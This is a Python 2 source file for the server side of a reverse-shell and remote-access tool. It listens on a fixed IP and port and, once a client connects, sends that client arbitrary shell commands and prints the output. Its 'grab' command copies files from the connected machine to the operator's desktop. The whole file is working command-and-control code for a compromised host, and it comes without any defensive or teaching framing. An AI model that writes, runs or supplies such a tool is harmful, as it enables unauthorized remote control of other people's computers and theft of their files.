# Server
import socket  # For TCP Connections


def transfer(conn, command, filename):
    conn.send(command)
    f = open('/root/Desktop/'+filename, 'wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find file' in bits:
            print '[-] Unable to find the file'
            break
        elif bits.endswith('DONE'):
            print'[+]Transfer Completed'
            f.close()
            break
        f.write(bits)
    f.close()


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("172.26.44.222", 1996))
    s.listen(1)
    conn, addr = s.accept()
    print "[+] Client %s connected : " % (addr,)
    hostname = conn.recv(1024)

    while True:
        command = raw_input(str(addr[0]+'@'+str(hostname) +'> ' ))
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()  # End the TCP connection with the host
            break

        elif 'grab' in command:
            grab, filename = command.split("*")
            transfer(conn, command, filename)

        else:
            conn.send(command)  # send Command
            data = conn.recv(1024)
            while 'DONE' not in data:
                print data
                data = conn.recv(1024)


def main():
    connect()


main()
